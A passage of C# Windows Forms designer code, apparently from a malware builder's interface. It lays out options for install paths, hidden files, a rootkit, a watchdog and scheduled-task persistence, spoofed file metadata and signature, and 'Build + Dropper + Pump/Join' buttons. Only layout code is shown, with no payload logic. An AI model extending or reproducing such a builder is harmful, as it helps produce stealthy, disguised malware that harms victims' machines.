		this.rjTextBox5.ForeColor = System.Drawing.Color.FromArgb(64, 64, 64);
		this.rjTextBox5.Location = new System.Drawing.Point(479, 127);
		this.rjTextBox5.Margin = new System.Windows.Forms.Padding(4);
		this.rjTextBox5.Multiline = false;
		this.rjTextBox5.Name = "rjTextBox5";
		this.rjTextBox5.Padding = new System.Windows.Forms.Padding(10, 7, 10, 7);
		this.rjTextBox5.PasswordChar = false;
		this.rjTextBox5.PlaceholderColor = System.Drawing.Color.DarkGray;
		this.rjTextBox5.PlaceholderText = "Task for start 30 minutes WatchDog";
		this.rjTextBox5.Size = new System.Drawing.Size(300, 31);
		this.rjTextBox5.TabIndex = 24;
		this.rjTextBox5.Texts = "";
		this.rjTextBox5.UnderlinedStyle = false;
		this.checkBox6.AutoSize = true;
		this.checkBox6.Location = new System.Drawing.Point(12, 71);
		this.checkBox6.Name = "checkBox6";
		this.checkBox6.Size = new System.Drawing.Size(79, 17);
		this.checkBox6.TabIndex = 22;
		this.checkBox6.Text = "Hidden File";
		this.checkBox6.UseVisualStyleBackColor = true;
		this.rjComboBox2.BackColor = System.Drawing.Color.White;
		this.rjComboBox2.BorderColor = System.Drawing.Color.FromArgb(192, 0, 192);
		this.rjComboBox2.BorderSize = 1;
		this.rjComboBox2.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDown;
		this.rjComboBox2.Enabled = false;
		this.rjComboBox2.Font = new System.Drawing.Font("Microsoft Sans Serif", 10f);
		this.rjComboBox2.ForeColor = System.Drawing.Color.DimGray;
		this.rjComboBox2.IconColor = System.Drawing.Color.FromArgb(192, 0, 192);
		this.rjComboBox2.Items.AddRange(new object[12]
		{
			"%ApplicationData%", "%Windows%", "%UserProfile%", "%ProgramFiles%", "%Templates%", "%LocalApplicationData%", "%CommonDocuments%", "%MyDocuments%", "%MyMusic%", "%MyVideos%",
			"%Cookies%", "%CommonPictures%"
		});
		this.rjComboBox2.ListBackColor = System.Drawing.Color.White;
		this.rjComboBox2.ListTextColor = System.Drawing.Color.DimGray;
		this.rjComboBox2.Location = new System.Drawing.Point(359, 172);
		this.rjComboBox2.MinimumSize = new System.Drawing.Size(200, 30);
		this.rjComboBox2.Name = "rjComboBox2";
		this.rjComboBox2.Padding = new System.Windows.Forms.Padding(1);
		this.rjComboBox2.Size = new System.Drawing.Size(250, 30);
		this.rjComboBox2.TabIndex = 21;
		this.rjComboBox2.Texts = "";
		this.rjTextBox4.BackColor = System.Drawing.SystemColors.Window;
		this.rjTextBox4.BorderColor = System.Drawing.Color.FromArgb(192, 0, 192);
		this.rjTextBox4.BorderFocusColor = System.Drawing.Color.HotPink;
		this.rjTextBox4.BorderRadius = 0;
		this.rjTextBox4.BorderSize = 1;
		this.rjTextBox4.Enabled = false;
		this.rjTextBox4.Font = new System.Drawing.Font("Microsoft Sans Serif", 9.5f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		this.rjTextBox4.ForeColor = System.Drawing.Color.FromArgb(64, 64, 64);
		this.rjTextBox4.Location = new System.Drawing.Point(359, 209);
		this.rjTextBox4.Margin = new System.Windows.Forms.Padding(4);
		this.rjTextBox4.Multiline = false;
		this.rjTextBox4.Name = "rjTextBox4";
		this.rjTextBox4.Padding = new System.Windows.Forms.Padding(10, 7, 10, 7);
		this.rjTextBox4.PasswordChar = false;
		this.rjTextBox4.PlaceholderColor = System.Drawing.Color.DarkGray;
		this.rjTextBox4.PlaceholderText = "Path Watch Dog";
		this.rjTextBox4.Size = new System.Drawing.Size(250, 31);
		this.rjTextBox4.TabIndex = 20;
		this.rjTextBox4.Texts = "";
		this.rjTextBox4.UnderlinedStyle = false;
		this.checkBox5.AutoSize = true;
		this.checkBox5.Location = new System.Drawing.Point(359, 141);
		this.checkBox5.Name = "checkBox5";
		this.checkBox5.Size = new System.Drawing.Size(81, 17);
		this.checkBox5.TabIndex = 19;
		this.checkBox5.Text = "Watch Dog";
		this.checkBox5.UseVisualStyleBackColor = true;
		this.checkBox5.CheckedChanged += new System.EventHandler(checkBox5_CheckedChanged);
		this.rjComboBox1.BackColor = System.Drawing.Color.White;
		this.rjComboBox1.BorderColor = System.Drawing.Color.FromArgb(192, 0, 192);
		this.rjComboBox1.BorderSize = 1;
		this.rjComboBox1.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDown;
		this.rjComboBox1.Font = new System.Drawing.Font("Microsoft Sans Serif", 10f);
		this.rjComboBox1.ForeColor = System.Drawing.Color.DimGray;
		this.rjComboBox1.IconColor = System.Drawing.Color.FromArgb(192, 0, 192);
		this.rjComboBox1.Items.AddRange(new object[12]
		{
			"%ApplicationData%", "%Windows%", "%UserProfile%", "%ProgramFiles%", "%Templates%", "%LocalApplicationData%", "%CommonDocuments%", "%MyDocuments%", "%MyMusic%", "%MyVideos%",
			"%Cookies%", "%CommonPictures%"
		});
		this.rjComboBox1.ListBackColor = System.Drawing.Color.White;
		this.rjComboBox1.ListTextColor = System.Drawing.Color.DimGray;
		this.rjComboBox1.Location = new System.Drawing.Point(12, 172);
		this.rjComboBox1.MinimumSize = new System.Drawing.Size(200, 30);
		this.rjComboBox1.Name = "rjComboBox1";
		this.rjComboBox1.Padding = new System.Windows.Forms.Padding(1);
		this.rjComboBox1.Size = new System.Drawing.Size(250, 30);
		this.rjComboBox1.TabIndex = 18;
		this.rjComboBox1.Texts = "";
		this.rjTextBox3.BackColor = System.Drawing.SystemColors.Window;
		this.rjTextBox3.BorderColor = System.Drawing.Color.FromArgb(192, 0, 192);
		this.rjTextBox3.BorderFocusColor = System.Drawing.Color.HotPink;
		this.rjTextBox3.BorderRadius = 0;
		this.rjTextBox3.BorderSize = 1;
		this.rjTextBox3.Font = new System.Drawing.Font("Microsoft Sans Serif", 9.5f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		this.rjTextBox3.ForeColor = System.Drawing.Color.FromArgb(64, 64, 64);
		this.rjTextBox3.Location = new System.Drawing.Point(12, 209);
		this.rjTextBox3.Margin = new System.Windows.Forms.Padding(4);
		this.rjTextBox3.Multiline = false;
		this.rjTextBox3.Name = "rjTextBox3";
		this.rjTextBox3.Padding = new System.Windows.Forms.Padding(10, 7, 10, 7);
		this.rjTextBox3.PasswordChar = false;
		this.rjTextBox3.PlaceholderColor = System.Drawing.Color.DarkGray;
		this.rjTextBox3.PlaceholderText = "Path Client";
		this.rjTextBox3.Size = new System.Drawing.Size(250, 31);
		this.rjTextBox3.TabIndex = 17;
		this.rjTextBox3.Texts = "";
		this.rjTextBox3.UnderlinedStyle = false;
		this.checkBox4.AutoSize = true;
		this.checkBox4.Location = new System.Drawing.Point(12, 94);
		this.checkBox4.Name = "checkBox4";
		this.checkBox4.Size = new System.Drawing.Size(64, 17);
		this.checkBox4.TabIndex = 16;
		this.checkBox4.Text = "Root Kit";
		this.checkBox4.UseVisualStyleBackColor = true;
		this.checkBox4.CheckedChanged += new System.EventHandler(checkBox4_CheckedChanged);
		this.rjTextBox2.BackColor = System.Drawing.SystemColors.Window;
		this.rjTextBox2.BorderColor = System.Drawing.Color.FromArgb(192, 0, 192);
		this.rjTextBox2.BorderFocusColor = System.Drawing.Color.HotPink;
		this.rjTextBox2.BorderRadius = 0;
		this.rjTextBox2.BorderSize = 1;
		this.rjTextBox2.Font = new System.Drawing.Font("Microsoft Sans Serif", 9.5f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		this.rjTextBox2.ForeColor = System.Drawing.Color.FromArgb(64, 64, 64);
		this.rjTextBox2.Location = new System.Drawing.Point(479, 94);
		this.rjTextBox2.Margin = new System.Windows.Forms.Padding(4);
		this.rjTextBox2.Multiline = false;
		this.rjTextBox2.Name = "rjTextBox2";
		this.rjTextBox2.Padding = new System.Windows.Forms.Padding(10, 7, 10, 7);
		this.rjTextBox2.PasswordChar = false;
		this.rjTextBox2.PlaceholderColor = System.Drawing.Color.DarkGray;
		this.rjTextBox2.PlaceholderText = "Task for start 5 minutes Client";
		this.rjTextBox2.Size = new System.Drawing.Size(300, 31);
		this.rjTextBox2.TabIndex = 14;
		this.rjTextBox2.Texts = "";
		this.rjTextBox2.UnderlinedStyle = false;
		this.checkBox1.AutoSize = true;
		this.checkBox1.Location = new System.Drawing.Point(6, 44);
		this.checkBox1.Name = "checkBox1";
		this.checkBox1.Size = new System.Drawing.Size(53, 17);
		this.checkBox1.TabIndex = 0;
		this.checkBox1.Text = "Install";
		this.checkBox1.UseVisualStyleBackColor = true;
		this.checkBox1.CheckedChanged += new System.EventHandler(checkBox1_CheckedChanged);
		this.tabPage3.Controls.Add(this.checkBox22);
		this.tabPage3.Controls.Add(this.panel4);
		this.tabPage3.Controls.Add(this.panel3);
		this.tabPage3.ImageKey = "file_settings_icon_207200.png";
		this.tabPage3.Location = new System.Drawing.Point(4, 39);
		this.tabPage3.Name = "tabPage3";
		this.tabPage3.Padding = new System.Windows.Forms.Padding(3);
		this.tabPage3.Size = new System.Drawing.Size(865, 359);
		this.tabPage3.TabIndex = 2;
		this.tabPage3.Text = "Common";
		this.tabPage3.UseVisualStyleBackColor = true;
		this.checkBox22.AutoSize = true;
		this.checkBox22.Location = new System.Drawing.Point(380, 18);
		this.checkBox22.Name = "checkBox22";
		this.checkBox22.Size = new System.Drawing.Size(103, 17);
		this.checkBox22.TabIndex = 11;
		this.checkBox22.Text = "Digital Signature";
		this.checkBox22.UseVisualStyleBackColor = true;
		this.panel4.Controls.Add(this.rjButton3);
		this.panel4.Controls.Add(this.checkBox21);
		this.panel4.Controls.Add(this.TextBoxFileVersion);
		this.panel4.Controls.Add(this.TextBoxProductVersion);
		this.panel4.Controls.Add(this.TextBoxOriginalFileName);
		this.panel4.Controls.Add(this.TextBoxTrademarks);
		this.panel4.Controls.Add(this.TextBoxCopyright);
		this.panel4.Controls.Add(this.TextBoxCompany);
		this.panel4.Controls.Add(this.TextBoxDescription);
		this.panel4.Controls.Add(this.TextBoxProduct);
		this.panel4.Location = new System.Drawing.Point(6, 6);
		this.panel4.Name = "panel4";
		this.panel4.Size = new System.Drawing.Size(364, 304);
		this.panel4.TabIndex = 12;
		this.rjButton3.BackColor = System.Drawing.Color.FromArgb(192, 0, 192);
		this.rjButton3.BackgroundColor = System.Drawing.Color.FromArgb(192, 0, 192);
		this.rjButton3.BorderColor = System.Drawing.Color.PaleVioletRed;
		this.rjButton3.BorderRadius = 0;
		this.rjButton3.BorderSize = 0;
		this.rjButton3.FlatAppearance.BorderSize = 0;
		this.rjButton3.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
		this.rjButton3.Font = new System.Drawing.Font("Arial", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		this.rjButton3.ForeColor = System.Drawing.Color.White;
		this.rjButton3.Location = new System.Drawing.Point(207, 260);
		this.rjButton3.Name = "rjButton3";
		this.rjButton3.Size = new System.Drawing.Size(74, 22);
		this.rjButton3.TabIndex = 45;
		this.rjButton3.Text = "Copy";
		this.rjButton3.TextColor = System.Drawing.Color.White;
		this.rjButton3.UseVisualStyleBackColor = false;
		this.rjButton3.Click += new System.EventHandler(rjButton3_Click);
		this.checkBox21.AutoSize = true;
		this.checkBox21.Location = new System.Drawing.Point(4, 264);
		this.checkBox21.Name = "checkBox21";
		this.checkBox21.Size = new System.Drawing.Size(70, 17);
		this.checkBox21.TabIndex = 12;
		this.checkBox21.Text = "Assembly";
		this.checkBox21.UseVisualStyleBackColor = true;
		this.TextBoxFileVersion.BackColor = System.Drawing.Color.White;
		this.TextBoxFileVersion.BorderColor = System.Drawing.Color.FromArgb(192, 0, 192);
		this.TextBoxFileVersion.BorderFocusColor = System.Drawing.Color.Magenta;
		this.TextBoxFileVersion.BorderRadius = 0;
		this.TextBoxFileVersion.BorderSize = 1;
		this.TextBoxFileVersion.Font = new System.Drawing.Font("Microsoft Sans Serif", 8f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		this.TextBoxFileVersion.ForeColor = System.Drawing.Color.FromArgb(64, 64, 64);
		this.TextBoxFileVersion.Location = new System.Drawing.Point(4, 229);
		this.TextBoxFileVersion.Margin = new System.Windows.Forms.Padding(4);
		this.TextBoxFileVersion.Multiline = false;
		this.TextBoxFileVersion.Name = "TextBoxFileVersion";
		this.TextBoxFileVersion.Padding = new System.Windows.Forms.Padding(10, 7, 10, 7);
		this.TextBoxFileVersion.PasswordChar = false;
		this.TextBoxFileVersion.PlaceholderColor = System.Drawing.Color.DarkGray;
		this.TextBoxFileVersion.PlaceholderText = "File Version";
		this.TextBoxFileVersion.Size = new System.Drawing.Size(277, 28);
		this.TextBoxFileVersion.TabIndex = 44;
		this.TextBoxFileVersion.Texts = "";
		this.TextBoxFileVersion.UnderlinedStyle = false;
		this.TextBoxProductVersion.BackColor = System.Drawing.Color.White;
		this.TextBoxProductVersion.BorderColor = System.Drawing.Color.FromArgb(192, 0, 192);
		this.TextBoxProductVersion.BorderFocusColor = System.Drawing.Color.Magenta;
		this.TextBoxProductVersion.BorderRadius = 0;
		this.TextBoxProductVersion.BorderSize = 1;
		this.TextBoxProductVersion.Font = new System.Drawing.Font("Microsoft Sans Serif", 8f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		this.TextBoxProductVersion.ForeColor = System.Drawing.Color.FromArgb(64, 64, 64);
		this.TextBoxProductVersion.Location = new System.Drawing.Point(4, 198);
		this.TextBoxProductVersion.Margin = new System.Windows.Forms.Padding(4);
		this.TextBoxProductVersion.Multiline = false;
		this.TextBoxProductVersion.Name = "TextBoxProductVersion";
		this.TextBoxProductVersion.Padding = new System.Windows.Forms.Padding(10, 7, 10, 7);
		this.TextBoxProductVersion.PasswordChar = false;
		this.TextBoxProductVersion.PlaceholderColor = System.Drawing.Color.DarkGray;
		this.TextBoxProductVersion.PlaceholderText = "Product Version";
		this.TextBoxProductVersion.Size = new System.Drawing.Size(277, 28);
		this.TextBoxProductVersion.TabIndex = 43;
		this.TextBoxProductVersion.Texts = "";
		this.TextBoxProductVersion.UnderlinedStyle = false;
		this.TextBoxOriginalFileName.BackColor = System.Drawing.Color.White;
		this.TextBoxOriginalFileName.BorderColor = System.Drawing.Color.FromArgb(192, 0, 192);
		this.TextBoxOriginalFileName.BorderFocusColor = System.Drawing.Color.Magenta;
		this.TextBoxOriginalFileName.BorderRadius = 0;
		this.TextBoxOriginalFileName.BorderSize = 1;
		this.TextBoxOriginalFileName.Font = new System.Drawing.Font("Microsoft Sans Serif", 8f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		this.TextBoxOriginalFileName.ForeColor = System.Drawing.Color.FromArgb(64, 64, 64);
		this.TextBoxOriginalFileName.Location = new System.Drawing.Point(4, 167);
		this.TextBoxOriginalFileName.Margin = new System.Windows.Forms.Padding(4);
		this.TextBoxOriginalFileName.Multiline = false;
		this.TextBoxOriginalFileName.Name = "TextBoxOriginalFileName";
		this.TextBoxOriginalFileName.Padding = new System.Windows.Forms.Padding(10, 7, 10, 7);
		this.TextBoxOriginalFileName.PasswordChar = false;
		this.TextBoxOriginalFileName.PlaceholderColor = System.Drawing.Color.DarkGray;
		this.TextBoxOriginalFileName.PlaceholderText = "Original Filename";
		this.TextBoxOriginalFileName.Size = new System.Drawing.Size(277, 28);
		this.TextBoxOriginalFileName.TabIndex = 42;
		this.TextBoxOriginalFileName.Texts = "";
		this.TextBoxOriginalFileName.UnderlinedStyle = false;
		this.TextBoxTrademarks.BackColor = System.Drawing.Color.White;
		this.TextBoxTrademarks.BorderColor = System.Drawing.Color.FromArgb(192, 0, 192);
		this.TextBoxTrademarks.BorderFocusColor = System.Drawing.Color.Magenta;
		this.TextBoxTrademarks.BorderRadius = 0;
		this.TextBoxTrademarks.BorderSize = 1;
		this.TextBoxTrademarks.Font = new System.Drawing.Font("Microsoft Sans Serif", 8f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		this.TextBoxTrademarks.ForeColor = System.Drawing.Color.FromArgb(64, 64, 64);
		this.TextBoxTrademarks.Location = new System.Drawing.Point(4, 136);
		this.TextBoxTrademarks.Margin = new System.Windows.Forms.Padding(4);
		this.TextBoxTrademarks.Multiline = false;
		this.TextBoxTrademarks.Name = "TextBoxTrademarks";
		this.TextBoxTrademarks.Padding = new System.Windows.Forms.Padding(10, 7, 10, 7);
		this.TextBoxTrademarks.PasswordChar = false;
		this.TextBoxTrademarks.PlaceholderColor = System.Drawing.Color.DarkGray;
		this.TextBoxTrademarks.PlaceholderText = "Trademarks";
		this.TextBoxTrademarks.Size = new System.Drawing.Size(277, 28);
		this.TextBoxTrademarks.TabIndex = 41;
		this.TextBoxTrademarks.Texts = "";
		this.TextBoxTrademarks.UnderlinedStyle = false;
		this.TextBoxCopyright.BackColor = System.Drawing.Color.White;
		this.TextBoxCopyright.BorderColor = System.Drawing.Color.FromArgb(192, 0, 192);
		this.TextBoxCopyright.BorderFocusColor = System.Drawing.Color.Magenta;
		this.TextBoxCopyright.BorderRadius = 0;
		this.TextBoxCopyright.BorderSize = 1;
		this.TextBoxCopyright.Font = new System.Drawing.Font("Microsoft Sans Serif", 8f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		this.TextBoxCopyright.ForeColor = System.Drawing.Color.FromArgb(64, 64, 64);
		this.TextBoxCopyright.Location = new System.Drawing.Point(4, 105);
		this.TextBoxCopyright.Margin = new System.Windows.Forms.Padding(4);
		this.TextBoxCopyright.Multiline = false;
		this.TextBoxCopyright.Name = "TextBoxCopyright";
		this.TextBoxCopyright.Padding = new System.Windows.Forms.Padding(10, 7, 10, 7);
		this.TextBoxCopyright.PasswordChar = false;
		this.TextBoxCopyright.PlaceholderColor = System.Drawing.Color.DarkGray;
		this.TextBoxCopyright.PlaceholderText = "Copyright";
		this.TextBoxCopyright.Size = new System.Drawing.Size(277, 28);
		this.TextBoxCopyright.TabIndex = 40;
		this.TextBoxCopyright.Texts = "";
		this.TextBoxCopyright.UnderlinedStyle = false;
		this.TextBoxCompany.BackColor = System.Drawing.Color.White;
		this.TextBoxCompany.BorderColor = System.Drawing.Color.FromArgb(192, 0, 192);
		this.TextBoxCompany.BorderFocusColor = System.Drawing.Color.Magenta;
		this.TextBoxCompany.BorderRadius = 0;
		this.TextBoxCompany.BorderSize = 1;
		this.TextBoxCompany.Font = new System.Drawing.Font("Microsoft Sans Serif", 8f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		this.TextBoxCompany.ForeColor = System.Drawing.Color.FromArgb(64, 64, 64);
		this.TextBoxCompany.Location = new System.Drawing.Point(4, 74);
		this.TextBoxCompany.Margin = new System.Windows.Forms.Padding(4);
		this.TextBoxCompany.Multiline = false;
		this.TextBoxCompany.Name = "TextBoxCompany";
		this.TextBoxCompany.Padding = new System.Windows.Forms.Padding(10, 7, 10, 7);
		this.TextBoxCompany.PasswordChar = false;
		this.TextBoxCompany.PlaceholderColor = System.Drawing.Color.DarkGray;
		this.TextBoxCompany.PlaceholderText = "Company";
		this.TextBoxCompany.Size = new System.Drawing.Size(277, 28);
		this.TextBoxCompany.TabIndex = 39;
		this.TextBoxCompany.Texts = "";
		this.TextBoxCompany.UnderlinedStyle = false;
		this.TextBoxDescription.BackColor = System.Drawing.Color.White;
		this.TextBoxDescription.BorderColor = System.Drawing.Color.FromArgb(192, 0, 192);
		this.TextBoxDescription.BorderFocusColor = System.Drawing.Color.Magenta;
		this.TextBoxDescription.BorderRadius = 0;
		this.TextBoxDescription.BorderSize = 1;
		this.TextBoxDescription.Font = new System.Drawing.Font("Microsoft Sans Serif", 8f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		this.TextBoxDescription.ForeColor = System.Drawing.Color.FromArgb(64, 64, 64);
		this.TextBoxDescription.Location = new System.Drawing.Point(4, 43);
		this.TextBoxDescription.Margin = new System.Windows.Forms.Padding(4);
		this.TextBoxDescription.Multiline = false;
		this.TextBoxDescription.Name = "TextBoxDescription";
		this.TextBoxDescription.Padding = new System.Windows.Forms.Padding(10, 7, 10, 7);
		this.TextBoxDescription.PasswordChar = false;
		this.TextBoxDescription.PlaceholderColor = System.Drawing.Color.DarkGray;
		this.TextBoxDescription.PlaceholderText = "Description";
		this.TextBoxDescription.Size = new System.Drawing.Size(277, 28);
		this.TextBoxDescription.TabIndex = 38;
		this.TextBoxDescription.Texts = "";
		this.TextBoxDescription.UnderlinedStyle = false;
		this.TextBoxProduct.BackColor = System.Drawing.Color.White;
		this.TextBoxProduct.BorderColor = System.Drawing.Color.FromArgb(192, 0, 192);
		this.TextBoxProduct.BorderFocusColor = System.Drawing.Color.Magenta;
		this.TextBoxProduct.BorderRadius = 0;
		this.TextBoxProduct.BorderSize = 1;
		this.TextBoxProduct.Font = new System.Drawing.Font("Microsoft Sans Serif", 8f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		this.TextBoxProduct.ForeColor = System.Drawing.Color.FromArgb(64, 64, 64);
		this.TextBoxProduct.Location = new System.Drawing.Point(4, 12);
		this.TextBoxProduct.Margin = new System.Windows.Forms.Padding(4);
		this.TextBoxProduct.Multiline = false;
		this.TextBoxProduct.Name = "TextBoxProduct";
		this.TextBoxProduct.Padding = new System.Windows.Forms.Padding(10, 7, 10, 7);
		this.TextBoxProduct.PasswordChar = false;
		this.TextBoxProduct.PlaceholderColor = System.Drawing.Color.DarkGray;
		this.TextBoxProduct.PlaceholderText = "Product";
		this.TextBoxProduct.Size = new System.Drawing.Size(277, 28);
		this.TextBoxProduct.TabIndex = 37;
		this.TextBoxProduct.Texts = "";
		this.TextBoxProduct.UnderlinedStyle = false;
		this.panel3.Controls.Add(this.checkBox20);
		this.panel3.Controls.Add(this.pictureBox1);
		this.panel3.Location = new System.Drawing.Point(376, 49);
		this.panel3.Name = "panel3";
		this.panel3.Size = new System.Drawing.Size(107, 136);
		this.panel3.TabIndex = 11;
		this.checkBox20.AutoSize = true;
		this.checkBox20.Location = new System.Drawing.Point(3, 109);
		this.checkBox20.Name = "checkBox20";
		this.checkBox20.Size = new System.Drawing.Size(47, 17);
		this.checkBox20.TabIndex = 11;
		this.checkBox20.Text = "Icon";
		this.checkBox20.UseVisualStyleBackColor = true;
		this.pictureBox1.Location = new System.Drawing.Point(3, 3);
		this.pictureBox1.Name = "pictureBox1";
		this.pictureBox1.Size = new System.Drawing.Size(100, 100);
		this.pictureBox1.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
		this.pictureBox1.TabIndex = 0;
		this.pictureBox1.TabStop = false;
		this.tabPage4.Controls.Add(this.rjButton10);
		this.tabPage4.Controls.Add(this.rjButton9);
		this.tabPage4.Controls.Add(this.rjButton8);
		this.tabPage4.Controls.Add(this.rjButton7);
		this.tabPage4.Controls.Add(this.rjButton6);
		this.tabPage4.Controls.Add(this.rjButton5);
		this.tabPage4.ImageKey = "-build_90148.png";
		this.tabPage4.Location = new System.Drawing.Point(4, 39);
		this.tabPage4.Name = "tabPage4";
		this.tabPage4.Padding = new System.Windows.Forms.Padding(3);
		this.tabPage4.Size = new System.Drawing.Size(865, 359);
		this.tabPage4.TabIndex = 3;
		this.tabPage4.Text = "Create";
		this.tabPage4.UseVisualStyleBackColor = true;
		this.rjButton10.BackColor = System.Drawing.Color.FromArgb(192, 0, 192);
		this.rjButton10.BackgroundColor = System.Drawing.Color.FromArgb(192, 0, 192);
		this.rjButton10.BorderColor = System.Drawing.Color.PaleVioletRed;
		this.rjButton10.BorderRadius = 0;
		this.rjButton10.BorderSize = 0;
		this.rjButton10.FlatAppearance.BorderSize = 0;
		this.rjButton10.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
		this.rjButton10.Font = new System.Drawing.Font("Arial", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		this.rjButton10.ForeColor = System.Drawing.Color.White;
		this.rjButton10.Location = new System.Drawing.Point(21, 120);
		this.rjButton10.Name = "rjButton10";
		this.rjButton10.Size = new System.Drawing.Size(154, 42);
		this.rjButton10.TabIndex = 51;
		this.rjButton10.Text = "Build + Dropper + Pump";
		this.rjButton10.TextColor = System.Drawing.Color.White;
		this.rjButton10.UseVisualStyleBackColor = false;
		this.rjButton10.Click += new System.EventHandler(rjButton10_Click);
		this.rjButton9.BackColor = System.Drawing.Color.FromArgb(192, 0, 192);
		this.rjButton9.BackgroundColor = System.Drawing.Color.FromArgb(192, 0, 192);
		this.rjButton9.BorderColor = System.Drawing.Color.PaleVioletRed;
		this.rjButton9.BorderRadius = 0;
		this.rjButton9.BorderSize = 0;
		this.rjButton9.FlatAppearance.BorderSize = 0;
		this.rjButton9.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
		this.rjButton9.Font = new System.Drawing.Font("Arial", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		this.rjButton9.ForeColor = System.Drawing.Color.White;
		this.rjButton9.Location = new System.Drawing.Point(21, 72);
		this.rjButton9.Name = "rjButton9";
		this.rjButton9.Size = new System.Drawing.Size(154, 42);
		this.rjButton9.TabIndex = 50;
		this.rjButton9.Text = "Build + Dropper + Join";
		this.rjButton9.TextColor = System.Drawing.Color.White;
		this.rjButton9.UseVisualStyleBackColor = false;
		this.rjButton9.Click += new System.EventHandler(rjButton9_Click);
		this.rjButton8.BackColor = System.Drawing.Color.FromArgb(192, 0, 192);
		this.rjButton8.BackgroundColor = System.Drawing.Color.FromArgb(192, 0, 192);
		this.rjButton8.BorderColor = System.Drawing.Color.PaleVioletRed;
		this.rjButton8.BorderRadius = 0;
		this.rjButton8.BorderSize = 0;
		this.rjButton8.FlatAppearance.BorderSize = 0;
		this.rjButton8.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
		this.rjButton8.Font = new System.Drawing.Font("Arial", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		this.rjButton8.ForeColor = System.Drawing.Color.White;
		this.rjButton8.Location = new System.Drawing.Point(181, 72);
		this.rjButton8.Name = "rjButton8";
		this.rjButton8.Size = new System.Drawing.Size(131, 42);
		this.rjButton8.TabIndex = 49;
		this.rjButton8.Text = "Build + Dropper";
		this.rjButton8.TextColor = System.Drawing.Color.White;
		this.rjButton8.UseVisualStyleBackColor = false;
		this.rjButton8.Click += new System.EventHandler(rjButton8_Click);
		this.rjButton7.BackColor = System.Drawing.Color.FromArgb(192, 0, 192);
		this.rjButton7.BackgroundColor = System.Drawing.Color.FromArgb(192, 0, 192);
		this.rjButton7.BorderColor = System.Drawing.Color.PaleVioletRed;
		this.rjButton7.BorderRadius = 0;
		this.rjButton7.BorderSize = 0;
		this.rjButton7.FlatAppearance.BorderSize = 0;
		this.rjButton7.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
		this.rjButton7.Font = new System.Drawing.Font("Arial", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		this.rjButton7.ForeColor = System.Drawing.Color.White;
		this.rjButton7.Location = new System.Drawing.Point(219, 24);
		this.rjButton7.Name = "rjButton7";
		this.rjButton7.Size = new System.Drawing.Size(93, 42);
		this.rjButton7.TabIndex = 48;
		this.rjButton7.Text = "Build + Join";
		this.rjButton7.TextColor = System.Drawing.Color.White;
		this.rjButton7.UseVisualStyleBackColor = false;
		this.rjButton7.Click += new System.EventHandler(rjButton7_Click);
		this.rjButton6.BackColor = System.Drawing.Color.FromArgb(192, 0, 192);
		this.rjButton6.BackgroundColor = System.Drawing.Color.FromArgb(192, 0, 192);
		this.rjButton6.BorderColor = System.Drawing.Color.PaleVioletRed;
		this.rjButton6.BorderRadius = 0;
		this.rjButton6.BorderSize = 0;
		this.rjButton6.FlatAppearance.BorderSize = 0;
		this.rjButton6.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
		this.rjButton6.Font = new System.Drawing.Font("Arial", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		this.rjButton6.ForeColor = System.Drawing.Color.White;
		this.rjButton6.Location = new System.Drawing.Point(120, 24);
		this.rjButton6.Name = "rjButton6";
		this.rjButton6.Size = new System.Drawing.Size(93, 42);
		this.rjButton6.TabIndex = 47;
		this.rjButton6.Text = "Build Pump";
		this.rjButton6.TextColor = System.Drawing.Color.White;
		this.rjButton6.UseVisualStyleBackColor = false;
		this.rjButton6.Click += new System.EventHandler(rjButton6_Click);
		this.rjButton5.BackColor = System.Drawing.Color.FromArgb(192, 0, 192);
		this.rjButton5.BackgroundColor = System.Drawing.Color.FromArgb(192, 0, 192);
		this.rjButton5.BorderColor = System.Drawing.Color.PaleVioletRed;
		this.rjButton5.BorderRadius = 0;
		this.rjButton5.BorderSize = 0;
		this.rjButton5.FlatAppearance.BorderSize = 0;
		this.rjButton5.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
		this.rjButton5.Font = new System.Drawing.Font("Arial", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		this.rjButton5.ForeColor = System.Drawing.Color.White;
		this.rjButton5.Location = new System.Drawing.Point(21, 24);
		this.rjButton5.Name = "rjButton5";
		this.rjButton5.Size = new System.Drawing.Size(93, 42);
		this.rjButton5.TabIndex = 46;
		this.rjButton5.Text = "Build";
		this.rjButton5.TextColor = System.Drawing.Color.White;
		this.rjButton5.UseVisualStyleBackColor = false;
		this.rjButton5.Click += new System.EventHandler(rjButton5_Click);
		this.imageList1.ImageStream = (System.Windows.Forms.ImageListStreamer)resources.GetObject("imageList1.ImageStream");
		this.imageList1.TransparentColor = System.Drawing.Color.Transparent;
